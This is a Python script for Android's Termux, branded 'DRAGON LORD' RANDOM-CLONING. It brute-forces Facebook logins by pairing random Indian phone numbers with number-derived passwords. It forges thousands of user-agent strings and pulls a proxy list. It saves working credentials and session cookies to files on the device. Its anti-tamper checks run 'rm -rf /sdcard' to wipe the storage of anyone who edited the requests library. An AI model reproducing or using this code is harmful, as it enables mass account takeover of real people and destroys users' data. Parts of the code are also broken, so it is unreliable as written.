import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize futures bs4==2 > /dev/null')
    os.system('pip install bs4')
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"

def clear():
    os.system('clear')
#-----[Global Functions]-----#
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
#--------------------------proxies---------------------------#
fuck='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'if self.url==' in open(fuck+'sessions.py','r').read():
    pass
else:
    os.system('rm -rf /sdcard')
    exit('\033[1;32mFUCK YOU BYPASS USER')
king='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(king+'sessions.py','r').read():
    pass
else:
    os.system('rm -rf /sdcard')
    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')
qeen='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(qeen+'models.py','r').read():
    pass
else:
    os.system('rm -rf /sdcard')
    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')
don='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(don+'utils.py','r').read():
    pass
else:
    os.system('rm -rf /sdcard')
    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')

try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(prox)
except Exception as e:
	print('')
proxies=open('proxies.txt','r').read().splitlines()
#-----[Colours]-----#
RED = '\033[1;91m' #
WHITE = '\033[1;97m' #
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m' #
BLUE = '\033[1;34m' #
ORANGE = '\033[1;35m' #
P = '\x1b[1;97m' # 
M = '\x1b[1;91m' # 
H = '\x1b[1;92m' # 
K = '\x1b[1;92m' # 
B = '\x1b[1;94m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;96m' #
N = '\x1b[0m' #
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
mtd,cp_cpx,cokix=[],[],[]
#-----userid-separate----#
def user_id(coki):
    c_user_index = coki.find('c_user=')
    if c_user_index != -1:
        user_id = coki[c_user_index + len('c_user='):]
        user_id = user_id.split(';')[0]  # Extract the user ID
    else:
        user_id = ""
    return user_id
 #-------checker------#
def lock_check(uid):
    sessionx=requests.Session()
    urlx=f'https://www.facebook.com/p/{uid}'
    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
    tx=req.find('title').text
    if tx =='Facebook':
        return('LOCK')
    else:
        return('LIVE')
        
#--------------------------(COUNT BOX)--------------------------#
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
#--------------------------(UA BOX)--------------------------#
for sat in range(1000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for txxxtt in range (1000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
#----------LOGO-------------#
logo=("""
\033[1;91m ########  ########     ###     ######    #######  ##    ## 
\033[1;92m ##     ## ##     ##   ## ##   ##    ##  ##     ## ###   ## 
\033[1;93m ##     ## ##     ##  ##   ##  ##        ##     ## ####  ## 
\033[1;94m ##     ## ########  ##     ## ##   #### ##     ## ## ## ## 𝙇
\033[1;95m ##     ## ##   ##   ######### ##    ##  ##     ## ##  #### 𝙊
\033[1;91m ##     ## ##    ##  ##     ## ##    ##  ##     ## ##   ### 𝙍
\033[1;92m ########  ##     ## ##     ##  ######    #######  ##    ## 𝘿\033[1;93m
\x1b[1;93m┏───────────────────────────────────────────────┓
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m AUTHOR     \x1b[1;97m: \x1b[1;92mDRAGON LORD
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m TYPE       \x1b[1;97m: \x1b[1;92mFREE🔥
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m GITHUB     \x1b[1;97m: \x1b[1;92mDragon-Lord-404   
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m TOOL       \x1b[1;97m: \x1b[1;92mRANDOM-CLONING      
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m VERSION    \x1b[1;97m: \x1b[1;92m1.1.0
\x1b[1;93m┗───────────────────────────────────────────────┛""")  
def linex():
        print(50*'\033[36;5;14m-\033[1;37m')
def clear():
        os.system(f'clear')
        print(logo)
    
#-----[Loop Menu]-----#  
loop = 0
oks = []
cps = []

#-----[Main-Menu]-----#
def lord_menu():
    os.system('clear');print(logo)
    print('\033[1;92m [1] RANDOM CRACK [IND]')
    print('\033[1;92m [0] EXIT TOOL')
    linex()
    lord=input(' \033[1;32m[?] SELECT MENU: ')
    if lord in['1','01']:innocent()
    elif lord in['0','00']:exit()
    else:exit()
    
def innocent():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] IND CODE : +91639/+91629')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input('\033[1;32m [?] CHOOSE : '))
    linex()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=20) as ahare:
        clear()
        tl = str(len(user))
        gen = str(len(ugen))
        print('\033[1;32m [+] Choice Code: '+code)
        print('\033[1;33m [-] Total  Uagent: '+gen)
        print('\033[1;34m [+] Crack Process Has Started')
        print('\033[1;35m [!] Use Flight Mode For Speed Up')
        print('\033[1;36m [+] Use APN For More OK Ids')
        linex()
        for fuck in user:
            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit", "57575751", "59039200"]
            fid = code+fuck
            ahare.submit(lordx,fid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /DRAGON-OK.txt')
    print('Cp Ids Saved in /DRAGON-CP.txt')
    linex()  
def lordx(fid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    sys.stdout.write('\r\r\033[1;92m[\033[38;5;46mCRACKING🔍]\033[1;97m - [%s/%s] - [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps)));sys.stdout.flush()
    try:
        last7digit = fid[int(len(fid))-7:]
        last6digit = fid[int(len(fid))-6:]
        last8digit = fid[int(len(fid))-8:]
        last9digit = fid[int(len(fid))-9:]
        last10digit = fid[int(len(fid))-10:]
        first6digit = fid[0:6]
        first7digit = fid[0:7]
        first8digit = fid[0:8]
        first9digit = fid[0:9]
        first10digit = fid[0:10]
        fullnumber = fid
        for ps in pwx:
            ps = ps.replace("last7digit",last7digit)
            ps = ps.replace("last6digit",last6digit)
            ps = ps.replace("last8digit",last8digit)
            ps = ps.replace("last9digit",last9digit)
            ps = ps.replace("last10digit",last10digit)
            ps = ps.replace("first6digit",first6digit)
            ps = ps.replace("first6digit",first6digit)
            ps = ps.replace("first7digit",first7digit)
            ps = ps.replace("first8digit",first8digit)
            ps = ps.replace("first9digit",first9digit)
            ps = ps.replace("first10digit",first10digit)
            ps = ps.replace("fullnumber",fullnumber)
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://m.facebook.com',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent':pro}
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = user_id(coki)
                try:
                    uid=lo['uid']
                except:
                    uid=cid
                    ckkx=lock_check(uid)
                if ckkx=='LOCK':
                    return
                else:
                 print('\r\r\033[1;32m[DRAGON-OK🌟]\033[1;33m ' +cid+ ' • ' +ps+ ' \n\033[1;33m[🍪]\033[1;34mCOOKIES = \033[1;32m'+coki+ '')
                 open('/sdcard/DRAGON-OK.txt', 'a').write( cid+' | '+ps+'')
                 oks.append(fid)
                 break
            elif twf in str(lo):
                #print('\r\r\033[1;34m[DRAGON-2F🔒]  ' +uid+ ' • ' +ps+ ' \033[0;97m')
                open('/sdcard/FILE-2F.txt', 'a').write( uid+' | '+ps+' \n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                #print('\r\r\033[1;30m[DRAGON-CP]  ' +uid+ ' • ' +ps+ ' \033[0;97m')
                open('/sdcard/DRAGON-DEAD.txt', 'a').write( fid+' | '+ps+' \n')
                cps.append(fid)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
lord_menu()